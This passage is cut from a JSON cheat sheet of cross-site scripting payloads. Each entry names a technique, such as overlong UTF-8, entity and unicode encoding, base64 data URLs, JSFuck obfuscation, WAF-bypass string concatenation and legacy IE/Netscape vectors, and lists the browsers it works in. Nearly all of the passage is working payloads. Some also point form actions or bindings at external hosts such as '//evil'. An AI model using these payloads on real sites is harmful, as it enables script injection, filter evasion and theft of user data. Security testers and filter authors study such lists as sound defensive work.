                "value": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />",
                "browsers": [
                    "chrome",
                    "firefox"
                ]
            },
            {
                "name": "Embed supports code attribute",
                "value": "<embed code=https://example.com width=500 height=500 type=text/html>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Object tag supports param url",
                "value": "<object width=500 height=500 type=text/html><param name=url value=https://example.com>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Object tag supports param code",
                "value": "<object width=500 height=500 type=text/html><param name=code value=https://example.com>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Object tag supports param movie",
                "value": "<object width=500 height=500 type=text/html><param name=movie value=https://example.com>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Object tag supports param src",
                "value": "<object width=500 height=500 type=text/html><param name=src value=https://example.com>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Assignable protocol with location",
                "value": "<script>location.protocol='javascript'</script>",
                "browsers": [
                    "chrome",
                    "safari"
                ]
            },
            {
                "name": "Assignable protocol with anchor",
                "value": "<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test</a>",
                "browsers": [
                    "chrome",
                    "safari"
                ]
            },
            {
                "name": "Navigation navigate method",
                "value": "<script>navigation.navigate('javascript:alert(1)')</script>",
                "browsers": [
                    "chrome"
                ]
            }
        ]
    },
    {
        "name": "Encoding",
        "id": "encoding",
        "data": [
            {
                "name": "Overlong UTF-8",
                "value": "%C0%BCscript>alert(1)</script> %E0%80%BCscript>alert(1)</script> %F0%80%80%BCscript>alert(1)</script> %F8%80%80%80%BCscript>alert(1)</script> %FC%80%80%80%80%BCscript>alert(1)</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Unicode escapes",
                "value": "<script>\\u0061lert(1)</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Unicode escapes ES6 style",
                "value": "<script>\\u{61}lert(1)</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Unicode escapes ES6 style zero padded",
                "value": "<script>\\u{0000000061}lert(1)</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Hex encoding JavaScript escapes",
                "value": "<script>eval('\\x61lert(1)')</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Octal encoding",
                "value": "<script>eval('\\141lert(1)')</script> <script>eval('alert(\\061)')</script> <script>eval('alert(\\61)')</script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Decimal encoding with optional semi-colon",
                "value": "<a href=\"&#106;avascript:alert(1)\">XSS</a><a href=\"&#106avascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "SVG script with HTML encoding",
                "value": "<svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1)</script></svg> <svg><script>x=\"&quot;,alert(1)//\";</script></svg>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Decimal encoding with padded zeros",
                "value": "<a href=\"&#0000106avascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Hex encoding entities",
                "value": "<a href=\"&#x6a;avascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Hex encoding without semi-colon provided next character is not a-f0-9",
                "value": "<a href=\"j&#x61vascript:alert(1)\">XSS</a> <a href=\"&#x6a avascript:alert(1)\">XSS</a> <a href=\"&#x6a avascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Hex encoding with padded zeros",
                "value": "<a href=\"&#x0000006a;avascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Hex encoding is not case sensitive",
                "value": "<a href=\"&#X6A;avascript:alert(1)\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "HTML entities",
                "value": "<a href=\"javascript&colon;alert(1)\">XSS</a> <a href=\"java&Tab;script:alert(1)\">XSS</a> <a href=\"java&NewLine;script:alert(1)\">XSS</a> <a href=\"javascript&colon;alert&lpar;1&rpar;\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "URL encoding",
                "value": "<a href=\"javascript:x='%27-alert(1)-%27';\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "HTML entities and URL encoding",
                "value": "<a href=\"javascript:x='&percnt;27-alert(1)-%27';\">XSS</a>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    },
    {
        "name": "Obfuscation",
        "id": "obfuscation",
        "data": [
            {
                "name": "Data protocol inside script src with base64",
                "value": "<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Data protocol inside script src with base64 and HTML entities",
                "value": "<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Data protocol inside script src with base64 and URL encoding",
                "value": "<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Iframe srcdoc HTML encoded",
                "value": "<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Iframe JavaScript URL with HTML and URL encoding",
                "value": "<iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"></iframe>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "SVG script with unicode escapes and HTML encoding",
                "value": "<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "Img tag with base64 encoding",
                "value": "<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    },
    {
        "name": "WAF bypass global objects",
        "id": "waf",
        "data": [
            {
                "name": "XSS into a JavaScript string: string concatenation (window)",
                "value": "';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: string concatenation (self)",
                "value": "';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: string concatenation (this)",
                "value": "';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: string concatenation (top)",
                "value": "';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: string concatenation (parent)",
                "value": "';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: string concatenation (frames)",
                "value": "';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: string concatenation (globalThis)",
                "value": "';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (window)",
                "value": "';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (self)",
                "value": "';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (this)",
                "value": "';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (top)",
                "value": "';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (parent)",
                "value": "';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (frames)",
                "value": "';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: comment syntax (globalThis)",
                "value": "';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (window)",
                "value": "';window['\\x61\\x6c\\x65\\x72\\x74'](window['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (self)",
                "value": "';self['\\x61\\x6c\\x65\\x72\\x74'](self['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (this)",
                "value": "';this['\\x61\\x6c\\x65\\x72\\x74'](this['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (top)",
                "value": "';top['\\x61\\x6c\\x65\\x72\\x74'](top['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (parent)",
                "value": "';parent['\\x61\\x6c\\x65\\x72\\x74'](parent['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (frames)",
                "value": "';frames['\\x61\\x6c\\x65\\x72\\x74'](frames['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence (globalThis)",
                "value": "';globalThis['\\x61\\x6c\\x65\\x72\\x74'](globalThis['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (window)",
                "value": "';window['\\x65\\x76\\x61\\x6c']('window[\"\\x61\\x6c\\x65\\x72\\x74\"](window[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (self)",
                "value": "';self['\\x65\\x76\\x61\\x6c']('self[\"\\x61\\x6c\\x65\\x72\\x74\"](self[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (this)",
                "value": "';this['\\x65\\x76\\x61\\x6c']('this[\"\\x61\\x6c\\x65\\x72\\x74\"](this[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (top)",
                "value": "';top['\\x65\\x76\\x61\\x6c']('top[\"\\x61\\x6c\\x65\\x72\\x74\"](top[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent)",
                "value": "';parent['\\x65\\x76\\x61\\x6c']('parent[\"\\x61\\x6c\\x65\\x72\\x74\"](parent[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames)",
                "value": "';frames['\\x65\\x76\\x61\\x6c']('frames[\"\\x61\\x6c\\x65\\x72\\x74\"](frames[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis)",
                "value": "';globalThis['\\x65\\x76\\x61\\x6c']('globalThis[\"\\x61\\x6c\\x65\\x72\\x74\"](globalThis[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (window)",
                "value": "';window['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (self)",
                "value": "';self['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (this)",
                "value": "';this['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (top)",
                "value": "';top['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (parent)",
                "value": "';parent['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (frames)",
                "value": "';frames['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: octal escape sequence (globalThis)",
                "value": "';globalThis['\\141\\154\\145\\162\\164']('\\130\\123\\123');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (window)",
                "value": "';window['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (self)",
                "value": "';self['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (this)",
                "value": "';this['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (top)",
                "value": "';top['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (parent)",
                "value": "';parent['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (frames)",
                "value": "';frames['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: unicode escape (globalThis)",
                "value": "';globalThis['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (window)",
                "value": "';window[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (self)",
                "value": "';self[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (this)",
                "value": "';this[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (top)",
                "value": "';top[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (parent)",
                "value": "';parent[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (frames)",
                "value": "';frames[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: RegExp source property (globalThis)",
                "value": "';globalThis[/al/.source+/ert/.source](/XSS/.source);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (window)",
                "value": "';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (self)",
                "value": "';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (this)",
                "value": "';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (top)",
                "value": "';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (parent)",
                "value": "';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (frames)",
                "value": "';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            },
            {
                "name": "XSS into a JavaScript string: Hieroglyphy/JSFuck (globalThis)",
                "value": "';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
                "browsers": [
                    "chrome",
                    "firefox",
                    "safari"
                ]
            }
        ]
    },
    {
        "name": "Classic vectors",
        "id": "classic",
        "data": [
            {
                "name": "Image src with JavaScript protocol",
                "value": "<img src=\"javascript:alert(1)\">",
                "browsers": []
            },
            {
                "name": "Body background with JavaScript protocol",
                "value": "<body background=\"javascript:alert(1)\">",
                "browsers": []
            },
            {
                "name": "Iframe data urls no longer work as modern browsers use a null origin",
                "value": "<iframe src=\"data:text/html,<img src=1 onerror=alert(document.domain)>\">",
                "browsers": []
            },
            {
                "name": "VBScript protocol used to work in IE",
                "value": "<a href=\"vbscript:MsgBox+1\">XSS</a> <a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS</a> <a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS</a> <a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS</a> <a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS</a> <a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS</a>",
                "browsers": []
            },
            {
                "name": "JScript compact was a minimal version of JS that wasn't widely used in IE",
                "value": "<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test</a> <a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test</a>",
                "browsers": []
            },
            {
                "name": "JScript.Encode allows encoded JavaScript",
                "value": "<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a> <a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS</a>",
                "browsers": []
            },
            {
                "name": "VBScript.Encoded allows encoded VBScript",
                "value": "<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>",
                "browsers": []
            },
            {
                "name": "JavaScript entities used to work in Netscape Navigator",
                "value": "<a title=\"&{alert(1)}\">XSS</a>",
                "browsers": []
            },
            {
                "name": "JavaScript stylesheets used to be supported by Netscape Navigator",
                "value": "<link href=\"xss.js\" rel=stylesheet type=\"text/javascript\">",
                "browsers": []
            },
            {
                "name": "Button used to consume markup",
                "value": "<form><button name=x formaction=x><b>stealme",
                "browsers": []
            },
            {
                "name": "IE9 select elements and plaintext used to consume markup",
                "value": "<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=\"supersecret\"</script>",
                "browsers": []
            },
            {
                "name": "XBL Firefox only <= 2",
                "value": "<div style=\"-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\"> <div style=\"\\-\\mo\\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)\"> <div style=\"-moz-bindin\\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\"> <div style=\"-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)\">",
                "browsers": []
            },
            {
                "name": "XBL also worked in FF3.5 using data urls",
                "value": "<img src=\"blah\" style=\"-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)\" />",
                "browsers": []
            },
            {
                "name": "CSS expressions <=IE7",
                "value": "<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\\6e(alert(1))> <div style=xss:expressio\\006e(alert(1))> <div style=xss:expressio\\00006e(alert(1))> <div style=xss:expressio\\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))>",
                "browsers": []
            },
            {
                "name": "In quirks mode IE allowed you to use = instead of :",
                "value": "<div style=xss=expression(alert(1))> <div style=\"color&#x3dred\">test</div>",
                "browsers": []
            },
            {
                "name": "Behaviors for older modes of IE",
                "value": "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS</a>",
                "browsers": []
            },
            {
                "name": "Older versions of IE supported event handlers in functions",
                "value": "<script> function window.onload(){ alert(1); } </script> <script> function window::onload(){ alert(1); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; } </script> </body>",
                "browsers": []
            },
            {
                "name": "GreyMagic HTML+time exploit (no longer works even in 5 docmode)",
                "value": "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> </BODY></HTML>",
                "browsers": []
            },
            {
                "name": "Firefox allows NULLS after &",
                "value": "<a href=\"javascript&#x6a;avascript:alert(1)\">Firefox</a>",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "Firefox allows NULLs inside named entities",
                "value": "<a href=\"javascript&colon;alert(1)\">Firefox</a>",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "Firefox allows NULL characters inside opening comments",
                "value": "<!-- ><img title=\"--><iframe/onload=alert(1)>\"> --> <!-- ><img title=\"--><iframe/onload=alert(1)>\"> -->",
                "browsers": [
                    "firefox"
                ]
            },
            {
                "name": "Safari used to allow any tag to have a onload event inside SVG",
                "value": "<svg><xss onload=alert(1)>",
                "browsers": [
                    "safari"
                ]
            },
            {
                "name": "Isindex using src attribute",
                "value": "<isindex type=image src=\"//evil?",
                "browsers": []
            },
            {
                "name": "Isindex using submit",
                "value": "<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"//evil?",
                "browsers": []
            },
            {
                "name": "Isindex and formaction",
                "value": "<isindex type=submit formaction=javascript:alert(1)>",
                "browsers": []
            },
            {
                "name": "Isindex and action",
                "value": "<isindex type=submit action=javascript:alert(1)>",
                "browsers": []
            },
            {
                "name": "discard tag and onbegin",
                "value": "<svg><discard onbegin=alert(1)>",
                "browsers": [
                    "chrome"
                ]
            },
            {
                "name": "Use element with an external URL",
                "value": "<svg><use href=\"//example.com/use_element/upload.php#x\" /></svg>",
                "browsers": []
            },
            {
